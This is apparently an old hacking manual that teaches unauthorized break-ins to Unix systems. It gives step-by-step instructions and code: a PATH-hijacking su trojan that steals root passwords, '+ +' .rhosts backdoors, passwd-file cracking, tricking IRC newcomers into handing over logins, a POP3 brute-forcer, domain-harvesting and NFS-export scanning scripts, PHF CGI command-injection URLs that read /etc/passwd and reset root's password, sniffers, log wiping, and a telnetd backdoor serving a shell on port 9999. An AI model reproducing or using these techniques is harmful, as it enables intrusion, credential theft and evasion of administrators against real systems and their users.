If you have any other exploits, bugs, sniffers or utils that are not in here
please mail them to ii@dormroom.pyro.net. And I will be sure to keep you
updated with the latest version of this toolkit.

Comments are welcome.  Sys admin's that want to keep their system clean are
welcome to request the latest version.

If you are looking for perfect grammar or spelling please put this file in
your circular file.  I put enough time into this and just put it through
a cheap spell check.

Whats new?  Look for more info on tricks of the trade, and nfs mounting
drives to gain access to shells.  I am sure you will like the additions.
I have added a login trojan, in.telnetd trojan, and some more scripts for
scanning machines for mountable drives.  Have pun!


I will add a (*)  to  u p d a t e d  s e c t i o n s.

True this manual will aid hackers into breaking into systems but it is also
provided to guide system admin's on different security problems and help
with things to watch for on their system to keep hackers off.

If you use this manual to gain access to any system where you do not belong,
and do any type of damage, you alone will suffer for your stupid actions!

I am not telling you to break into any system, I am just showing some of
my experience, and things that I would do if I was to break into my own system.

This is for information only.....

Preface
*******

Ok, lets get started.  If you are going to hack, you must be doing this for a
reason.  All hackers have their reasons for doing what they do.  Most are just
hungry to learn.  Most of what I have learned about unix, i have learned on
some service providers or someone else's machine.  I am one for the 'hands on'
experience.  There is much to learn and you would have to read 20,000 books
just to get what you would learn out of a few config files, a few admin email
messages, some .bash_history files, and some poking around a few systems.

Here in this manual you should learn how to be the 'complete hacker' and come
up with a style of your own.  It will not take to long, but it will take some
practice and experience before you will be able to call yourself a hacker.

Not just anyone that can crack a password file, and log into a unix machine
can call themselves a hacker.  Ok, you can get root access to a box!  You still
are not a hacker!  You need to know why you are a hacker first, and then have
your 'code' and 'style'.  You need a purpose and a reason for hacking into any
box.  The true hacker knows why he is doing what he does, and is doing it for
reasons like knowledge, free information, and ACCESS. The true hacker will
turn one hack into access to many different systems and providers and keep this
access for future learning and more FREE information.

The wan-a-be hacker will not be invisible, and will do many stupid things like:
delete or corrupt data, down the machine, run bots or irc clients from root
accounts or machines Give the passwords he cracked to everyone in the world
to prove they can hack. Or they might just do stupid things that will get
themselves cought.  I think sometimes this is done purposely just to draw
attention to themselves so they can get cought and make the announcement that
they are a hacker, and they were here!  A real hacker needs no such glory,
he just needs the access and wants to keep it and be invisible! He will not
tell many friends about the system, he will not give out the passwords or
accounts, he will keep others off so he can continue his access there and
keep it clean.

Here in this manual i hope that i can add enough style so that you can have
real heart in this matter and and be a good clean hacker.

Happy hacking ...

--------------------------------
Chapter I

Unix commands you need to know.
--------------------------------

There are just a few basic commands you need to learn, and then some unix
programs that will aid you in logging in logging into or keeping access to
the machine.

Call your local internet service provider and ask them to sell you a shell
account so that you will have something to practice on to learn these
basic commands.  The average shell account might cost you $10.00 per month
if you don't already get one with your existing account.

--------------
Section 1A

Basic commands
--------------

I hope you have a basic knowledge of DOS, that would help a bit, and I will
assume that you already do in writing this manual.

DOS Commands you are used to first:

REMEMBER: unix is case sensitive, so if I here use lower case you must also,
if I use a space you must also.  DOS will let you get away with allot of things
but unix will not!

DIR/W      = ls
DIR        = ls -l
DIR/AH     = ls -al  AH=(hidden) -al=(include hidden files as well as regular)
RENAME     = mv
ATTRIB     = chmod
MD         = mkdir
RD         = rmdir
DEL        = rm
COPY       = cp

These are the basic commands, i suggest that you lookup the man pages
on each one of these commands from your unix shell.  You would do this by
typing 'man command' without the ''.

each one of these commands will have switches for them, like cp -R to copy
files and directories.  So you would type man cp to get all of the switches
you can use with the copy command.

cd {then press enter} will always take you to your home directory
cp filename $HOME will copy the file to your home directory
cd ~username will take you to that users home dir if you have access to be
   there
pwd {press enter} will show you what directory you are in.

-------------
Section 1B
Telnet
-------------

Telnet is a command that you can use from a shell account, or from an exe
file (telnet.exe) from Windows, OS/2, Windows 95 and other operating systems
that will let you connect to another machine on the net.  There are other
programs you will learn about here like FTP, and rlogin that you can use as well
but now we will use telnet.

You can use telnet if you know the IP address or the host name you want to
connect or login to.  To use the command you would just use the telnet program
to connect to the IP or host like this:

Telnet netcom.com  or  telnet 206.146.43.56

Ok, now lets login:

telnet machine.com

trying .....

Connected to machine.com

Linux 2.0.28 (machine.com) (ttyp0)

machine login:username
password:#######

bash$

Your prompt might look different, but we will use this one.

Notice above that it will tell you the O/S when you get the login prompt.
You can use this if you get a large collection of passwd files.  Even before
going on to crack them sort them by O/S types by just telnet-ing to them to
see what they are running.  There are other ways, but lets keep this telnet
topic going for a sec... telnet domain.name.com, after you see what they are
running make a note of this and ctrl ] to break out of the connection.

Put all of your linux passwd files into a pile to be cracked first.  All we
need is one account that works for the system, and we can be almost sure
we will have root on that machine!  There are way to many holes in linux to
think we will not be able to own one of those machines, so lets get to work so
we can start this wonderful world of hacking.

----------------------
Unix File Permissions
----------------------

bash$

bash$ cd /tmp
bash$ ls -l
total 783
-rwx------   1 wood     users           1 Jan 25 18:28 19067haa
-rw-r--r--   1 berry    mail            1 Jan 16 12:38 filter.14428
-rw-------   1 rhey19   root       395447 Jan 24 02:59 pop3a13598
-rw-------   1 rhey19   root       395447 Jan 24 03:00 pop3a13600
drwxr-xr-x   4 root     root         1024 Jan 12 13:18 screens

First notice that we used a / and not \ to change to the tmp directory! Unix
uses the / as the root so it is backwards from DOS here.
Notice we did ls -l for the long directory. If we did 'ls' we would have what
you see below.

bash$ ls
19067haa      filter.14428  pop3a13598    pop3a13600    screens

With what we see here can not tell much, so most of the time we will be
using ls -al with the -al we will see the hidden files also, hidden
files and directories will always start with a '.'.  Now watch:

bash$ ls -al
total 794
drwxrwxrwt   4 root     root         8192 Jan 25 23:05 .
drwxr-xr-x  22 root     root         1024 Dec 28 18:07 ..
-rw-r--r--   1 berry    users           6 Jan 25 23:05 .pinetemp.000
drwxr-xr-x   2 berry    users        1024 Jan 25 23:05 .test
-rwx------   1 wood     users           1 Jan 25 18:28 19067haa
-rw-r--r--   1 berry    mail            1 Jan 16 12:38 filter.14428
-rw-------   1 rhey19   root       395447 Jan 24 02:59 pop3a13598
-rw-------   1 rhey19   root       395447 Jan 24 03:00 pop3a13600
drwxr-xr-x   4 root     root         1024 Jan 12 13:18 screens

.pinetemp.000 is a hidden file, and .test is a hidden directory.

-rw-r--r--   1 berry    mail            1 Jan 16 12:38 filter.14428

row 1          row2     row3
----------------------------

Now here we need to learn about permissions, users, and groups.

Row #1 is the file permissions
Row #2 is who owns the file
Row #3 is the group owner of the file

File permissions are grouped together into three different groups.
If the line starts with a d, it is a directory, if there is no d, it is a file.

- --- --- ---
| |   |   |--------> Other = anyone on the machine can access
| |   |------------> Group = certain groups can access
| |----------------> User  = only the owner can access
|------------------> Directory Mark



- rw- r-- r--
| |   |   |--------> Other can only read the file
| |   |------------> Group can only read the file
| |----------------> User  can read or write to the file
|------------------> It is not a directory


- rwx rwx r-x
| |   |   |--------> Other can read and execute the file
| |   |------------> Group can read write and execute the file
| |----------------> User  can read write and execute the file
|------------------> It is not a directory


The owner is the user name in row #2 and the group owner is the name in row #3.
In DOS the file has to have a .exe, .com, or .bat extension to execute, but in
unix all you need is the --x in your group of user, other, group

You can change these permissions if you own the file or have root access:

---------------------------------------------------------------------------
chmod oug+r filename will make all three groups of permissions be able to
read the file.

chmod og-r filename would make the file readable only to the user that owns
the file.  (notice the - or + to set the file yes or no)

chmod +x filename would make the file execute by all.

chown username filename would make the file owned by another user.
chgrp groupname filename would make the file owned by another group.
---------------------------------------------------------------------------

Make sure to keep file perm's and groups the same or you will be sniffed
out and booted from the system.  Changing configs on the system might only
break other functions, so keep your paws off or you are just asking to get
cought.  Only do what you are *SURE* of.  Only use commands that you know,
you might find yourself spending hours fixing just one typo like
chown -R username /* could keep you busy for a year ;)

Just be careful!

We will get into this stuff more as we go into the needs for this.

------------------
Section 1C Rlogin
------------------

There is another command you might use and we will get into this elsewhere
as we get into using rlogin to login to a system without a password.

For now read the man pages on rlogin by using the man rlogin from your
shell account.

The basic command would be :

rlogin -l username hostname
connecting....
password:

bash$

Rlogin requires the user to have a file in their home directory that tells
what system they can receive the rlogin from.  In this file .rhosts it would
look like this:

username hostname (or) hostname

if you were to add to this file   + +   it would let any user from any host
login without a password.

The file would look like this:

----- cut here ------
+ +
_____ cut here ------

if they already had entry's you could add the + + under their host names, but
remember now they would notice seeing they would now be able to rlogin
without the password.  You would be targeting people that did not
already have a .rhosts file.

---------------
Section 1D FTP
---------------

Another way to login will be FTP.  You can use a windows client, or just
login from a shell.

ftp ftp.domain.com

This will allow you to download or upload files to the site you are hacking.
Just make sure to edit the xferlog (see section 6d) to wipe your tracks
on the system.  Remember NEVER to ftp or telnet out of the hacked system, only
log into it!  If you are coming from your own system, or from another hacked
account you might just be giving your login and password to the system admin
or another hacker on their system.  There could be a telnetd or ftpd trojan
loaded on the system, or even a sniffer.  Now you would have just gave someone
your login id and password.  And if this was the system admin, he might have
the idea that revenge is sweet ;)

Using ftp from the shell, I would suggest using a few commands:

After you login, and have your prompt, type these commands
pressing enter after each one.

prompt
hash
bin

prompt will allow you to type a command like (mget *) or (mput*) and transfer
an entire directory without having it prompt you for each file yes or no.

               hash marks
hash will put ############ on the screen so you can see the transfer
is still moving and at what speed.

bin will make sure you get the files in the right mode, and if transferring
binary files, you will be sure they will uncompresses.

The transfer commands are easy, get filename, or, put filename, or for many
files you can use regular wild cards with mput  or mget.

--------------------
Section 1E
GCC compiler
--------------------

There will be a time when you will need to compile a .c file.

It is best to compile on the machine you are working on.  So upload or copy
and past the files to the hacked box and compile them there.  If you have
problems with their compiler you can try to upload pre-compiled files.

One way to get the file up to the victims machine would be to use copy
and paste.  Get a good tsr or windows shareware program to do this if
you do not have any way to do it now.  You can copy a script file from
one window and paste it into an editor on the victims machine, and then compile
the new file.  Walaa... no upload log of the file.  You can copy and paste
from the victims machine as well so that there are no download logs of ascii
files.

To copy and paste you can just open an editor on the hacked box, and then copy
from your other session, and paste your script into the editor and save the
file.  This way there will not be anything in the xferlog yet.

You can do the same thing with the password file.  If you do decide to
download the password file using ftp, make sure to copy it to your home
directory first under a different name.

bash:/etc:> cp passwd $HOME/plog  would copy the file called passwd from the /etc
directory you were in, to your home directory in a file called plog instead of
passwd.  Admin's grep the xfer logs looking for who is downloading the passwd
file.

Another way to get file to or from the box without showing up in the logs
would be to open an irc session on the victims machine, then from your other
session where you are already a user on irc, send the files using dcc.

The command to send the files would be /dcc send <nick> <filename>
The command to get the file on the other side would be /dcc get <nick> <file>

It would be nice if you had a bot loaded on the irc when you were hacking so
that you could just send files to the bot and have it auto receive them.

A 'bot' is a robot program that you can load in the background on your shell
account that will receive files, keep channels open, etc...


The GCC compiler is easy...

gcc filename.c -o filenameyouwant

If i was to compile a file called z2.c that would zap the log files i would
type this:

gcc z2.c -o zap

This would give me a file that would exe, called zap

If I just typed : gcc z2.c  I would have a file named a.out, that was the executable
file and would have to rename it to zap, or some name i would know by doing
this: mv a.out zap

Now I would have a file named zap that was executable instead of a.out.

You will want to make sure you are not naming these files names that sys admin's
will know.  If you had a sniffer file called 'linuxsniffer.c' you don't
want to keep the same name ;) call it something like:

gcc linuxsniffer.c -o lsn

Remember also sometimes you can execute these files names right in the directory
by just typing the file name like for our 'lsn' (sniffer) above just by
typing lsn.  But sometimes this will not work unless you add a ./ to the
command.  So remember, sometimes you will need to type ./lsn  or your file
name.

Also there will be a time you will want a program to run in the background
even after you logoff.  Like in the case of the sniffer above.  In this case
you might want to name your sniffer something that would not be so easy
noticed.  Use your own style here.  BUT to make it stay in the background while
you are off the system you need to run the command with a & after the command.

lsn&

If you were to just type lsn, your screen would pause, and you would not be
able to type while the program was sniffing, but if you typed lsn& it would
load and the system prompt would come right back to you.  Also the system
would let you know it was loaded by giving you the process id # that it
was loaded as.

You could view the process with the ps -x command, you might want to run
ps -auxe |more

a= all
u= show user
x= yours
e= env

some machines
f=tree
or command: pstree

------------------------------------
Chapter II
Getting started (your first account)
------------------------------------

There are many ways to get a starter account. I will go into each area to
help you get started.  All you need is one good account to spawn off to
hundreds of accounts.  Think of this; You get one good exploitable system,
most any linux machine ;)

Now you get root access and load a sniffer program.  The TCP sniffer will
search out any login process on the network and log the login and password
for any telnet, ftp, or dial-in session going out or coming into the system.

Now even if it is a small ethernet connection you have around 100 passwords
for a few machines or domains.  If a larger net provider you have hundreds
of accounts all over the world!  All you need for this is one good account
and password to an exploitable system.  If it seems you can not exploit
root on the system, this might be a good system to crack passwords on and
exchange the accounts for other accounts from hackers or irc users that are
looking to load a bot but do nt have the shell account or disk space to do
it.  NEVER give out even one password to a system you exploited root on.
Keep these systems to yourself!

Lets now get into ways to get your first accounts.

------------------------
Section 2A.
Cracking passwd files
------------------------

If you are hacking with the right frame of mind, you will run the crack
program until you get one good account that will let you into the system.

You will login and see if you can exploit root on the system, if so, get root,
get the files you need to use into your nested directory, and erase your
presence, and clean all of the logs.  Now you are ready to load your sniffer.

Why go on hacking passwords for a system that within 24 hours you will have
most of the passwords anyway?  Not only for the machine you just hacked, but
other machines that were connected to as well.  If the system is not
exploitable don't even waste your time on it, go on to the next.  At a latter
date if you want to crack passwords for accounts to trade go ahead.

If you get an admin's account cracked you might want to read his history files,
and see if he is using the su command to access root allot.  If he is you can
use an su trojan on him.  This will get you the root password.  This works like
this:  You change his shell script so that a hidden directory (.term) is good,
is set in the search path before all other directories.  You put a fake su
binary in the .term (or other) directory.  He types su, everything looks good
to him, he types in the root password when prompted, the password id copied to
a log file in /tmp/.elm69, and deletes the trojan su file, and returns to him a
password error telling him to try again.  He thinks he must have done something
wrong and runs su again, but this time the real one and logs in.

You will find this fake su program in the last appendix named uuencoded files.

Here are the docs:

Fake SU by Nfin8 - i-e

IRC: /msg i-e

Easy as 1,2,3 ...

1. Change the path in one of the user accounts that you have access to that
you see is using SU from reading their history files, to hit a path first
that you have placed the su trojan file into.  .term or .elm is good!

2. Make sure to edit the top of the su.c file to the path you will be using
so that the sutrojan will delete isself and let the real SU work for the
second try.

3. Put all of the files in the target directory and compile the su.c file.

gcc su.c -o su

Then delete all of the files but the su.  All done!

.bash_profile might look like this:

# .bash_profile

# Get the aliases and functions
if [ -f ~/.bashrc ]; then
        . ~/.bashrc
                fi

# User specific environment and startup programs

PATH=$PATH:$HOME/bin
ENV=$HOME/.bashrc
USERNAME=""

export USERNAME ENV PATH

You change the first line to: PATH=$HOME/.term:$PATH:$HOME/bin


When the sys admin run's 'SU' it will run the SU-trojan in the .term
directory first and report that the password he typed was wrong, the
Trojan su program would have put a hidden file in the /tmp directory for
you that contains the root password (or account passwd) typed.  If it was
an account rather then the root password it will let you know the account
name. Then the trojan su program deletes itself so that the next try will
get the real su program.


You can find the admin's at the top section of the passwd file in the /etc
directory.  Just type :  more passwd

You can be sure that the first two real accounts made in the passwd file are
admin's, also sometimes you can find others by where their directories are
located in the password file.  Like /staff/username.

The history files are in each users account directory.  You can read these to
see what the last commands were that were typed by the user.  Sometimes as
much as the last 100+ commands.  Look for the file .bash_history, or History,
you can read these using more.  command: more .bash_history, or most times to
keep your typing you can type : more .b*  (or) just type : more .b (and then
hit the tab key on your keyboard).

Ok so now you need a good password cracking program. You can see in the next
chapter on how to get password files from systems that you do not have an
account on, but it is catch 22, you need the password cracking program too.

There are three things that you will need.

1. Password cracking program
2. Good word files
3. Password files

The best password cracking program to start would be crackerjack.  You can
search the web and find this easy as 1,2,3.  Download it and you are ready
to go.  If you are a bit more advanced you can download a cjack for unix and run
it in a shell.  But if you are just getting started get the DOS/OS/2 version.

Also search for some good word files.  The best word files are the names.
You will find that most unsecured passwords out there are guy's girlfriends
names, of girls boyfriends names ;)  You will find word files like
'familynames' 'babynames' 'girlsnames' 'boysnames' 'commonpasswords'
hackersdict' and other like these to be the best.

Load crackerjack like this:

[D:\jack]jack

Cracker Jack version 1.4 for OS/2 and DOS (386)
Copyright (C) 1993, The Jackal, Denmark

PWfile(s) : domain.com.passwd

Wordfile  : domain.com.passwd

Like above run the password file as the wordfile first.  This will get you all
of the logon's first that used their login name as their password, also if they
used any other info like their real name or company name it will hit right away
and you will not have to wait for the program to search through a word file.

If you want to hash the word file to get more out of it you can read the doc's
for crackerjack.

Hashing is where you can tell crackerjack to change the case of the wordfile
or even add numbers or letters to the beginning or end of the words in the word
file, like sandy1 or 1sandy.  You will find that many users do this and think
they are more secure.

Here are hashing files for both the passwd file and your word list.  After
looking these over you will see how you can modify these or create new ones
to suit your needs.

You can get password files without an account, see next chapter.

------------------
Section 2B.
Talking to newbe's
------------------

There are other ways to get an account without doing much work.  Park yourself
on an irc channel that you made with a title about hacking.  Also try joining
other channels already on the irc.  Channels would include:
#hacking #unix #unixhacking #hack #hackers #hacker #virus #virii
#hackers_hideout or any others you can find.

Now what you are looking for are newbe's looking to learn or exploit their shell
they are on already.  There is always someone out there that does not know as
much as you.  Watch for someone out there that asks a newbe question and gets
no answer or even kicked off the channel.  Here is your mark ;)

/msg him so that others can't see that you are talking to him, and begin to ask
him questions, try to help him, but not too much ;)  Finally tell him that you
can login for him and do it.  This could be to snatch the passwd file or god
knows what.  Promise him the world and get that login password.  Now you have
a start and can start your on-hands learning process.  If you get root on the
system you might not want to expose that to him, but you can feed him other
goodies that will keep him busy while you sniff some other passwords on the
system.

So now if there are some out there that remember i-e when you gave him your
login and password, you can be sure that the above never happened <G>rin ...

I tend to like to help people learn so I am telling the truth when i say I
have dealt honestly with most everyone I have come across.

-------------
Section 2C.
The hard way
-------------

There is another way you can do this.  Be sure that on most big systems
that users do not use secure passwords.  from a shell do this:

finger @domainname.com  Watch I will do a real domain:

[10:35am][/home/ii]finger @starnet.net
[starnet.net]
Login    Name                 Tty   Idle  Login Time   Office     Office Phone

Now we might want to try logging in later, log this information:

Login chris Password try: Chris, chris, myers, Myers, chrismyers, etc...

This one looks good, wendt:Catherine:catherine

Here is another command:

[10:35am][/home/ii]finger -l @starnet.net

You get more info to play with ;)


I know this can make you tired ....

Remember this stuff will log your tries, so if you get on and get root, clean
the logs ;)

Here is a small .c file you can use if you get on.

pop3hack.c
----- cut here

#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdarg.h>

/* First, define the POP-3 port - almost always 110 */
#define POP3_PORT               110

/* What we want our program to be masked as, so nosy sys admin's don't kill us */
#define MASKAS                  "vi"

/* Repeat connect or not - remember, logs still report a connection, so
you might want to set this to 0. If set to 0, it will hack until it finds
1 user/password then exit. If set to 1, it will reconnect and try more
user/passwords (until it runs out of usernames) */
#define RECONNECT       0

----- cut here

You could also write a small perl script that will finger @ from a domain
list and cat the response to a file, then when done it will go back and try
to login using pop3d username-username (or other info) and putting the
response into another file for you.

You can ftp to rs.internic.net:
in the domain directory you will find:

com.zone.gz
edu.zone.gz
gov.zone.gz
mil.zone.gz
net.zone.gz
org.zone.gz

download these files and run getdomain.pl (script below) on the domains you
want to target first, in this manor:

"perl getdomain.pl com.zone com >com.all"

What this will do is rip all of the .COM domains and put them into a file
called comm.all.

If you wanted to do all of the .EDU addresses you would type:

perl getdomain.pl edu.zone edu >edu.all

Now you will have a list to use with your probe called edu.all

Here is the perl script

getdomain.pl
---- cut here
#!/usr/bin/perl

# GetDomain By Nfin8 / Invisible Evil
# Questions /msg i-e  or  /msg i^e
#
# Retrieve command line arguments.
my($inputfile, $domain) = @ARGV;
usage() if (!defined($inputfile) || !defined($domain));

# Open and preprocess the input file.
open(INFILE, "<$inputfile") or die("Cannot open file $inputfile for reading!\n");
my(@lines) = <INFILE>;

# Initialize main data structure.
my(%hash) = {};
my($key) = "";

foreach (@lines) {
  $key = (split(/\ /))[0];
  chop($key);
  next if ((($key =~ tr/.//) < 1) || 
            (uc($domain) ne uc(((split(/\./, $key))[-1]))) || 
            ($key =~ m/root-server/i));
  $hash{$key}++;
}

# Close input file and output data structure to STDOUT.
close(INFILE);

foreach (sort(keys(%hash))) {
  print "$_\n";
}

sub usage {
  print("\n\ngetdomain:\n");
  print("Usage: getdomain [inputfile] [search]\n\n");
  print("Where [search] is one of \'com\', \'edu\', \'gov\', \'mil\' or \'net\'.\n\n");
  exit(0);
}
  
0;
  
---- cut here - end of script -----

To use the script above all you need to do is copy between the lines above
and name it getdomain.pl, now copy it into the unix os and type
chmod +x getdomain.pl

Now it is ready to run with the command lines above.

------------------------------------------
Section 2D.
using Mount to gain access to unix systems
------------------------------------------

This is not hard to do and there are many systems out there that are mountable.
Mount is a command in unix that will allow you to mount remote machines drives
you yours.  This is done so you can do installs from other machines, or just
share drives or directories across the network.  The problem is that many
admins are good with unix commands or setup.  Or maybe they are just plain
lazy and mount the drives with world access not understanding that the world
can mount the drive and gain write access to their users directories.

What you will need to get started here is a hacked root account.  To be able to
mount the remote drive and gain access you will need to modify the system's
password file and use the su command.

Ok let's say we have root access. let's get started!

You can see if another system has mountable drives by using the showmount
command.

From root account:

$root> showmount -e wwa.com
mount clntudp_create: RPC: Port mapper failure - RPC: Unable to receive

Ok, no problem, this domain will not work, go on to the next one...

$root> showmount -e seva.net
Export list for seva.net:
/var/mail                                        pluto.seva.net
/home/user1                                      pluto.seva.net
/usr/local                                       pluto.seva.net,rover.seva.net
/export/X11R6.3                                  rover.seva.net
/export/rover                                    rover.seva.net,pluto.seva.net
/export/ftp/linux-archive/redhat-4.1/i386/RedHat (everyone)

Notice the (everyone), this would be good if we wanted to install linux
from this guy's box, but we want open directories to users.... so go on to
the next one...

$root> showmount -e XXXXX.XXX < this one worked ... find your own ;)
Export list for XXXXX.XXX:
/export/home (everyone)

Now this guy mounted his home directory, the user accounts are off of the home
directory ;) and look above ... (everyone) can access it!


Ok, this section was to show you how to see if they are mountable, in the next
section i will show you how to mount and hack it.  But for now, here is a
script that will scan for EVERY DOMAIN on the internet that is mountable and
log them for you.

To use this script simply use the domain ripper in the PHF section and download
the needed files from rs.internic.net rip some domains and name the file
'domains' and startup the script.  To make it run in the background put a
& after the command.  like this: cmount.pl&

How it works:

When you run the file it will go to the domains list and run showmount -e
on each domain, if it finds that there is a return on mountable drives
it will save the info in the current directory in files named:
domain.XXX.export.  All you have to do is view the files and mount the drives!

--------------- start of cmount.pl
#!/usr/bin/perl -w
#
# Check NFS exports of hosts listed in file.
# (Hosts are listed, once per line with no additional whitespaces.)
#
# ii@dormroom.pyro.net - 2/27/97.

# Assign null list to @URLs which will be added to later.
my(@result) = ();
my(@domains) = ();
my($program) = "showmount -e ";

# Pull off filename from commandline. If it isn't defined, then assign default.
my($DomainFilename) = shift;
$DomainFilename = "domains" if !defined($DomainFilename);

# Do checking on input.
die("mountDomains: $DomainFilename is a directory.\n") if (-d $DomainFilename);
 
# Open $DomainFilename.
open(DOMAINFILE, $DomainFilename) or 
  die("mountDomains: Cannot open $DomainFilename for input.\n");
  
while (<DOMAINFILE>) {
  chomp($_);
  print "Now checking: $_";

  # Note difference in program output capture from "geturl.pl".  
  open (EXECFILE, "$program $_ |");
  @execResult = <EXECFILE>;
  next if (!defined($execResult[0]));
  if ($execResult[0] =~ /^Export/) {
    print " - Export list saved.";
    open (OUTFILE, ">$_.export");
    foreach (@execResult) {
      print OUTFILE;
    }
    close (OUTFILE);
  }
  close(EXECFILE);
  print "\n";
}
  
# We are done. Close all files and end the program.
close (DOMAINFILE);

0;
----------------- end of cmount.pl

Ok, now on to mounting the drives ....

lets say we did a showmount -e domain.com and got back:

Export list for domain.com:
/   (everyone)
/p1 (everyone)
/p2 (everyone)
/p3 (everyone)
/p5 (everyone)
/p6 (everyone)
/p7 (everyone)
/var/spool/mail titan,europa,galifrey
/tmp            (everyone)

We would want to mount /  .. yup .... this guy has his entire system mountable!

$root> mkdir /tmp/mount
$root> mount -nt nfs domain.com:/ /tmp/mount

If he had the home directory mountable the command would be:

$root> mount -nt nfs domain.com:/home /tmp/mount

To unmount the system, make sure you are out of the directory and type:
$root> umount /tmp/mount

Make sure you make the mount directory first, you can make this anywhere on the
system that you want.  If the systems /mnt directory is empty you can use it
also.

Ok this is for real:

bash# ls -al /mnt  ; making sure the mnt dir is empty
ls: /mnt: No such file or directory ; there was not even a dir there ;)
bash# mkdir /mnt ; lets make one for them <g>rin
bash# mount -nt nfs xxxxxx.xxx:/export/usr /mnt ; let's mount the sucker ...
bash# cd /mnt ; changing to the mounted drive...
bash# ls ; just the plain dir ..
TT_DB             home              raddb             share
back              local             radius-961029.gz  www
exec              lost+found        radius-961029.ps
bash# ; there is is up there, the home dir ... oh good ...
bash# cd home
bash# ls -l  ; long directory listing ... tom is looking good here ;)

So now we have access, so lets just hack this system ... oops, that is another
lesson!  Have pun!

---------------------
Chapter III
Getting passwd files
---------------------

Here are some ways to get password files from unix systems.  Most of them
you will need an account, but there is still a way to access to the system
without having an account.  Here you will learn the difference between a
regular passwd file and a shadowed passwd file.  You will also learn a way
to read the shadowed password file.

------------------
Section 3A
PHF WWW PH Query
------------------

There is a program in the WWW cgi-bin directory called phf, if the file
is there, and has permission x, you can access it by using the www, or
a text version browser in linux called lynx.  Now you can read files on the
system (yup .. /etc/passwd) and save them to files local in your computer.

There are many things we can get done here.  If the server is running their
httpd server as root owner, we can be root by using phf and even change an
account password on the machine.

I will include a perl script here that will auto check all of the systems out
there by using the getdomain.pl script above and check what the server is
running under.  If it is running under root, it will just log the id, if the
server is not running under root, it will auto get the passwd file from the
/etc directory and name it domainname.???.passwd.

I will also attach a script that will allow you to use a simple command from
a shell and if phf is on the system allow you to pipe commands from the shell
to the remote system with one command line.

Ok now that you know what is coming, lets teach you how to use phf.

Use your favorite web browser, or the text version in unix called most of
the time lynx, on some systems www.

After the screen comes up type the letter g, now a line appears like below:

URL to open:
  Arrow keys: Up and Down to move. Right to follow a link; Left to go back.
  H)elp O)ptions P)rint G)o M)ain screen Q)uit /=search [delete]=history list

You type:

URL to open: http://xxx.org/cgi-bin/phf/?Qalias=x%0aid
  Arrow keys: Up and Down to move. Right to follow a link; Left to go back.
  H)elp O)ptions P)rint G)o M)ain screen Q)uit /=search [delete]=history list

It returns:

                                 QUERY RESULTS



   /usr/local/bin/ph -m alias=x id

uid=65534(nobody) gid=65535(nogroup) groups=65535(nogroup)


So here we see it is running under a user (nobody), so we can be a user named
nobody on this system.  We are not root, but this will have to do ;)

Notice the command line:

http://afp.org/cgi-bin/phf/?Qalias=x%0aid

The id was the command to the server to give us the id of the user.  Some times
you will have to give the full path to the file you want to run, in this case
it would have been: http://afp.org/cgi-bin/phf/?Qalias=x%0a/usr/bin/id

Notice that after the %0a you start your command line.  If you need to enter
a space you would put a %20 instead of the space.  Here would be some sample
command lines. I will start them with %0a

Cat the passwd file
%0a/bin/cat%20/etc/passwd

Get a long directory of the /etc directory of all files starting with pass
%0als%20-al%20/etc/pass*

backup the passwd file if you have root access to httpd to passwd.my
%0acp%20/etc/passwd%20/etc/passwd.my

Change the root passwd (if the server will let you (most times it works)
%0apasswd%20root

(the above should let you login without a password, make sure to copy the
passwd.my file over the passwd file right away, and then delete the backup,
then make yourself an suid bash shell somewhere and rename it, sniff to get
your passwords)

If you know how to type commands in unix and don't forget that you need to
use %20 in the place of spaces, you will not have any problems!

Ok lets cat the passwd file on this box ;)

URL to open: http://xxx.org/cgi-bin/phf/?Qalias=x%0acat%20/etc/passwd

We get:


                                 QUERY RESULTS



   /usr/local/bin/ph -m alias=x cat /etc/passwd

mary:EauDLA/PT/HQg:503:100:Mary C. Hilton:/home/mary:/bin/bash

A small passwd file <g>rin

If you want to save this to a file in your local directory, just choose the
print option in the text browser and you will get an option to save the file
in your home directory.

Lets learn something here:

mary:EauDLA/PT/HQg:503:100:Mary C. Hilton:/home/mary:/bin/bash
1   :2            :3  :4  :5             :6         :7

1=username 2=encrypted password 3=user number 4=groop id 5=real name
6=home directory 7=shell

Ok, lets say you do not want to keep using the WWW browser, here is a script
you can compile to just type regular commands from your shell.

Yet Another way to use phf was written by Quantumg on his web page, this is
new and just thought of, so I was sure to add this right into this manual
for you.

Here is the text:


New QG Phf Attack MO
--------------------

yerp.. I know it's a long time since phf has been considered a viable
attack but you'd be surprised just how many stupid linux operators there
are out there..

first.. a little background.

Phf is a cgi-bin executable found on apache web servers.  It is sploitable
and the result is you can execute commands on the web server as whoever
they're running httpd as, usually nobody but sometimes as root.  To sploit
it is simply a matter of connecting to the web server and giving the
query:

 	GET /cgi-bin/phf/?Qalias=X%0a

followed by the command you wish to execute with %20 used for spaces.  You
can do no piping, quotes, shell replacements, etc.

ok.. so on with the attack.  What we are going to do is go and look for a
linux box (I usually telnet to the box to see the issue.net) which has the
phf bug.  I, like a whole lot of other people, use the program phf 
loxsmith to exploit the phf bug.  All it does is connect to the host
specified in argv[2] and dump the query with argv[1] as the command.  It
is used as such:

	phf id www.host.to.hack

where id is the command you want to execute.  This is the first thing I'd
do.  Not only does it tell me if the box is sploitable, it also tells me
what they are running httpd as.  So, assuming we get back a nice response,
we have a box to hack.  The first problem is getting stuff onto the box to
execute.  It's not much of a problem.  You can 1 check for writable ftp
directory's or 2, and my personal favorite, use rcp.  To use rcp you need
to set up a few things on your machine (or better yet, a machine that you
hacked earlier).  The first of these things is an account that you can use
for the transfer.  Select something simple and unmemoriable.  I use the
username "test".  Next you need to put the name of the host you are
hacking (www.host.to.hack) in your /etc/hosts.equiv.  Then you need to
make sure you have a "shell" line in your /etc/inetd.conf and that you
have restarted inetd to read this line.  Finally you need to create a
.rhosts file in the test's homedir that has the name of the host you're
hacking followed by the username that httpd is running as.

/etc/hosts.equiv:
www.host.to.hack

/etc/inetd.conf:
shell   stream  tcp     nowait  root    /usr/sbin/tcpd  in.rshd -L

~test/.rhosts:
www.host.to.hack nobody

ok.. so once you have all that set up you can get things onto the remote
host. 

What I used to do was transfer little hacks across that had been heavily
modified to work whilst being executed by phf.  It was not a pleasant
affair, nor very effective.  Now we have a solution.  What we send across
is a modified in.telnetd.  It has been modified to start up in "debug"
mode which makes it bind to a port (9999) and execute /bin/sh instead of
/bin/login.  It also forks before executing the shell which means it will
sit on port 9999 and accept as many connections as you want.  
